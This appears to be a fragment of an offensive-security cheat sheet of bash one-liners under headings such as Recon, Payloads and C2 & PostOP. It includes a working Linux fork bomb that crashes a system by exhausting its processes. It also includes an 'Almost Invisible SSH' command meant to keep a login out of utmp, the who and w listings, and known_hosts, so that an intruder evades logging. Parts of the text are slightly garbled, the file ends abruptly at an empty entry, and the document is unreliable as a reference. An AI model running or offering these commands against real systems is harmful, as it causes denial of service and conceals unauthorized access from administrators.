### Recon

```bash
#List all nmap scripts
ls /usr/share/nmap/scripts | sed 's/\.nse$//' | sort
```
#### Payloads
```bash
#"Linux Fork Bomb" - Create processes until the system "crashes"
:(){ :|: & };:
```


```bash
#"Almost Invisible SSH" - This will not add your user to the /var/log/utmp file and you won't show up in w or who command of logged in users. It will bypass profile and bash profile as well. On your client side it will stop logging the host name to ~/.ssh/known_hosts.*  Credit: netmux 
ssh -o UserKnownHostsFile=/dev/null -T user@example. com "bash -ยก" 
```
### C2 & PostOP
```bash
#Delete empty files
